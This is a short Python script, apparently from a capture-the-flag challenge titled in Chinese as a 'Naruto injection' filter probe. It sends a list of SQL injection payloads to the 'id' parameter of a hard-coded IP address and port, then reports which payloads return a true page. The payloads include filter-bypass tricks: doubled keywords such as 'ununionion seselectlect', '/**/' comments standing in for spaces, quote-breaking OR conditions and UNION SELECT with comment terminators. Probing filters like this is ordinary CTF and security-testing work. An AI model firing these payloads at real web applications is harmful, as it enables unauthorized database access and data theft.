# -*- coding: utf-8 -*-
"""火影的注入 — 过滤器行为探测"""
import re
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33704"


def get(q):
    try:
        with urllib.request.urlopen(BASE + "/?id=" + urllib.parse.quote(q), timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def hit(b):
    return "archive-img" in b


def t(b):
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()[-60:]


CASES = [
    "1",
    "0",
    "1",                                   # 基线 TRUE
    "1 and 1",                              # and 被删?
    "1 anandd 1",                           # 双写
    "1/**/anandd/**/1",
    "1 oorr 1",
    "1'oorr'1'='1",
    "-1'/**/oorr/**/'1'like'1",
    "1 union select 1,2,3",
    "1 ununionion seselectlect 1,2,3",
    "-1'/**/ununionion/**/seselectlect/**/1,2,3-- -",
    "-1'/**/ununionion/**/seselectlect/**/1,2,3/**/where/**/1-- -",
]
for c in CASES:
    s, b = get(c)
    print("%-52s -> %s %s | %s" % (c, s, "TRUE " if hit(b) else "FALSE", t(b)))
